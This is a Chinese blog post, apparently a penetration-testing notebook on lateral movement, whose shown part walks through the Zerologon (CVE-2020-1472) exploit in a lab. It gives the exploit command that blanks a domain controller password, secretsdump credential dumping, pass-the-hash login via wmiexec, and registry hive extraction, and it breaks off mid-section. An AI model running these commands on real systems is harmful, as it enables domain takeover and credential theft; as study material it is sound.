@@ -1,0 +1,4960 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta name="referrer" content="no-referrer"/>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="HacKerQWQ">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="HacKerQWQ">
+    
+    <meta name="keywords" content="hexo,HackerQWQ,blog,CTFer">
+    
+    <meta name="description" content="">
+    <meta name="description" content="简单记录一下内网中横向移动的方法 漏洞利用Zero-logon漏洞简介CVE-2020-1472是一个windows域控中严重的远程权限提升漏洞，此漏洞是微软8月份发布安全公告披露的紧急漏洞，CVSS评分为10分。未经身份认证的攻击者可通过使用 Netlogon 远程协议（MS-NRPC）连接域控制器来利用此漏洞，成功利用此漏洞的攻击者可获得域管理员权限。该漏洞由 Secura 公司的 Tom T">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透之横向移动">
+<meta property="og:url" content="https://hackerqwq.github.io/2022/07/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="简单记录一下内网中横向移动的方法 漏洞利用Zero-logon漏洞简介CVE-2020-1472是一个windows域控中严重的远程权限提升漏洞，此漏洞是微软8月份发布安全公告披露的紧急漏洞，CVSS评分为10分。未经身份认证的攻击者可通过使用 Netlogon 远程协议（MS-NRPC）连接域控制器来利用此漏洞，成功利用此漏洞的攻击者可获得域管理员权限。该漏洞由 Secura 公司的 Tom T">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220730222656756.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220730222745041.png">
+<meta property="og:image" content="https://hackerqwq.github.io/2022/07/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/Users/78574/AppData/Roaming/Typora/typora-user-images/image-20220730224107270.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220730225414119.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220730230830159.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220730231425252.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220730231649056.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220730233948018.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220730234410979.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220730234842307.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220731000423911.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220731000530531.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210702114049.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210702122609.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210702124412.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210702170303.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210702172016.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210702172353.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210702172454.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210704161608.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210704162644.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210704162621.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210704163046.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210704165723.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210704171633.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210704182258.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210704182014.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801155758146.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801173118295.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801173546203.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801180857427.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801183941078.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801151723320.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801151819078.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801151942558.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801152051552.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801152317927.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801152426090.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210716180429.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200518105842-7b66f4b4-98b3-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200518105851-80b6db46-98b3-1.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801184621835.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801184712146.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801184819426.png">
+<meta property="og:image" content="https://ask.qcloudimg.com/http-save/7220648/pdilj7g11g.png?imageView2/2/w/1620">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801185034901.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20211225203251660.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220725222911186.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220727204924999.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220727205108036.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220727205224382.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220727210206392.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220728102742920.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220728102815994.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220728102946582.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220728103352342.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220728110458925.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/071444321736b7090d2b78d5b6f17ffb.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/bb9326a2c294234ab6fd15288a2db99b.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220802180431241.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220802180735170.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220802181112565.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220802181211676.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220821115342154.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220821114956127.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220821115235266.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220821114721261.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220821114729062.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220821115649333.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220821120056619.png">
+<meta property="article:published_time" content="2022-07-27T12:42:10.000Z">
+<meta property="article:modified_time" content="2022-08-21T07:03:10.814Z">
+<meta property="article:author" content="HacKerQWQ">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="横向移动">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220730222656756.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <title>内网渗透之横向移动 · HacKerQWQ&#39;s Studio</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/avatar/picture.jpeg" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >HacKerQWQ的博客空间</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">内网渗透之横向移动</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>HacKerQWQ的博客空间</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            内网渗透之横向移动
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "内网渗透">内网渗透</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "横向移动">横向移动</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">6.6k</span>Reading time: <span class="post-count reading-time">28 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2022/07/27</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            
+<main class="main post-page">
+    <article class="article-entry">
+        <p>简单记录一下内网中横向移动的方法</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="Zero-logon"><a href="#Zero-logon" class="headerlink" title="Zero-logon"></a>Zero-logon</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a><strong>漏洞简介</strong></h3><p><strong>CVE-2020-1472</strong>是一个windows域控中严重的远程权限提升漏洞，此漏洞是微软8月份发布安全公告披露的紧急漏洞，CVSS评分为10分。未经身份认证的攻击者可通过使用 Netlogon 远程协议（MS-NRPC）连接域控制器来利用此漏洞，成功利用此漏洞的攻击者可获得域管理员权限。该漏洞由 Secura 公司的 Tom Tervoort 发现提交并命名为 ZeroLogon。</p>
+<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>Windows受影响版本：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1</span><br><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</span><br><span class="line">Windows Server 2012</span><br><span class="line">Windows Server 2012 (Server Core installation)</span><br><span class="line">Windows Server 2012 R2</span><br><span class="line">Windows Server 2012 R2 (Server Core installation)</span><br><span class="line">Windows Server 2016</span><br><span class="line">Windows Server 2016 (Server Core installation)</span><br><span class="line">Windows Server 2019</span><br><span class="line">Windows Server 2019 (Server Core installation)</span><br><span class="line">Windows Server, version 1903 (Server Core installation)</span><br><span class="line">Windows Server, version 1909 (Server Core installation)</span><br><span class="line">Windows Server, version 2004 (Server Core installation)</span><br></pre></td></tr></table></figure>
+
+<p><strong>Samba受影响版本：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4.0 &lt; Samba &lt; 4.8 且 未配置 server schannel &#x3D; yes</span><br><span class="line"></span><br><span class="line">Samba &gt; 4.0 且 Smb.conf配置文件中配置了server schannel &#x3D; no或server schannel &#x3D; auto</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><blockquote>
+<p>域控主机：192.168.1.128，winserver2012</p>
+<p>域内普通主机：192.168.1.130，winserver2008 R2</p>
+</blockquote>
+<p><strong>工具：</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a></li>
+</ul>
+<p><strong>环境配置：</strong></p>
+<p>需要<strong>python</strong>环境，可上传安装包安装或者挂代理运行python脚本</p>
+<p>在普通主机配置环境</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;安装impacket环境</span><br><span class="line">cd impacket-0.10.0&#x2F;</span><br><span class="line">pip3 install .</span><br></pre></td></tr></table></figure>
+
+<p><strong>探测漏洞是否存在:</strong></p>
+<ol>
+<li><p>获取域控主机名和域控ip</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain controllers&quot; &#x2F;domain</span><br><span class="line">ping -a domainname</span><br></pre></td></tr></table></figure>
+
+<p>获取域控主机名为<code>DC$</code></p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220730222656756.png" alt="image-20220730222656756"></p>
+<p>域控ip为<code>192.168.1.128</code></p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220730222745041.png" alt="image-20220730222745041"></p>
+</li>
+<li><p>poc检测域控是否存在漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python zerologon_tester.py 域控主机名 域控ip</span><br><span class="line">python .\zerologon_tester.py DC$ 192.168.1.128</span><br></pre></td></tr></table></figure>
+
+<p>返回 Success，说明漏洞很可能存在！</p>
+</li>
+</ol>
+<p><img src="/2022/07/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/Users\78574\AppData\Roaming\Typora\typora-user-images\image-20220730224107270.png" alt="image-20220730224107270"></p>
+<p><strong>漏洞攻击</strong></p>
+<ol>
+<li>置空DC的密码</li>
+</ol>
+<p>exp：<a target="_blank" rel="noopener" href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 cve-2020-1472-exploit.py 域控主机名 域控ip</span><br><span class="line">python cve-2020-1472-exploit.py DC$ 192.168.1.128</span><br></pre></td></tr></table></figure>
+
+<p>此时如果机器重启则很可能起不来，会出问题</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220730225414119.png" alt="image-20220730225414119"></p>
+<p>置空密码成功！<strong>此时需要尽快操作，否则可能脱域</strong></p>
+<ol start="2">
+<li>secretsdum.py导出域内所有用户的凭证</li>
+</ol>
+<p>使用impacket中的<strong>secretsdump.py</strong>，因为置空了密码，所以这里无需密码就能导出hash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py 域名&#x2F;域控主机名@域控ip -no-pass</span><br><span class="line">python secretsdump.py redteam.org&#x2F;DC$@192.168.1.128 -no-pass</span><br></pre></td></tr></table></figure>
+
+<p>得到所有凭证</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220730230830159.png" alt="image-20220730230830159"></p>
+<p>域控内所有账户的hash都导出来了，包括本地用户和域用户</p>
+<ol start="3">
+<li>使用<strong>wmiexec.py</strong>远程登录</li>
+</ol>
+<p>获取了域控的hash，可以进行<strong>远程登陆</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py doamin&#x2F;dc_name@dc_ip -hashes :NTLM hash</span><br><span class="line">python wmiexec.py redteam.org&#x2F;administrator@192.168.1.128 -hashes :42899445a8a932c420bd63c9d377fbe3 -codec gbk</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220730231425252.png" alt="image-20220730231425252"></p>
+<p><strong>恢复域控原始hash</strong></p>
+<ol>
+<li>导出 sam system 等⽂件到本地，获取域控机器上本地保存之前的 hash 值⽤于恢复，不然就脱域了</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;切换到Temp目录</span><br><span class="line">cd Windows\Temp</span><br><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br><span class="line">或者</span><br><span class="line">&#x2F;&#x2F;命令三合一</span><br><span class="line">reg save HKLM\SYSTEM system.save&amp;&amp;reg save HKLM\SAM sam.save&amp;&amp;reg save HKLM\SECURITY security.save</span><br><span class="line">&#x2F;&#x2F;下载文件</span><br><span class="line">lget system.save</span><br><span class="line">lget sam.save</span><br><span class="line">lget security.save</span><br><span class="line">&#x2F;&#x2F;lget system.save&amp;&amp;lget sam.save&amp;&amp;lget security.save</span><br></pre></td></tr></table></figure>
+
+<p>保存注册表</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220730231649056.png" alt="image-20220730231649056"></p>
+<p>下载注册表</p>
